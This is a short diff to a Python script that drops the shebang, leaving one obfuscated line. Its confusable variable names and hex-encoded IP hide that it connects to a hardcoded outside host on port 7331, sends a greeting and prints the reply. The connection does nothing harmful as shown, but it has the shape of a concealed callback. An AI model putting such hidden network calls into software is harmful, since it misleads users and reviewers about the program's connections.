@@ -1,3 +1,1 @@
-#!/usr/bin/env python3
-
 lllllllllllllll = print; from socket import SOCK_STREAM as IlIllIIlIIllII, AF_INET as IIIIlIlllllIIl, socket as IllllIlIllIIlI; lllIllIllllllIIlII = '.'.join([str(int(x, 16)) for x in ['0x6b', '0xad', '0x8f', '0x0f']]); IlIIIllIIIlIlIllIl = 7331; lIlIIllIIlIIIIIlll = IllllIlIllIIlI(IIIIlIlllllIIl, IlIllIIlIIllII); lIlIIllIIlIIIIIlll.connect((lllIllIllllllIIlII, IlIIIllIIIlIlIllIl)); IlIllIlIlIIIllIIII = 'Hello, Server!'; lIlIIllIIlIIIIIlll.sendall(IlIllIlIlIIIllIIII.encode('utf-8')); IlIIlllIlIlIIlIlII = lIlIIllIIlIIIIIlll.recv(1024).decode('utf-8'); lllllllllllllll(f'Server response: {IlIIlllIlIlIIlIlII}'); lIlIIllIIlIIIIIlll.close()
